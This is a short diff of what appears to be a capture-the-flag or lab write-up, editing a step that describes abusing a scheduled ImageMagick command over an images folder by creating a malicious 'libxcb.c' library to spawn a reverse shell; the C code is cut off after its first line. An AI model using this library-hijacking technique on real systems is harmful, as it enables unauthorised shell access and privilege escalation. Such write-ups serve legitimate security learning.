@@ -207,7 +207,7 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 ```
 
 + We can manipulate the path `/opt/app/static/assets/images` to spawn the reverse shell.
-+ Firstly, we access `/opt/app/static/assets/images` and create the file libxcb.c
++ Firstly, we access `/opt/app/static/assets/images` and create the file `libxcb.c`:
 
 ```C
 #include <stdio.h>
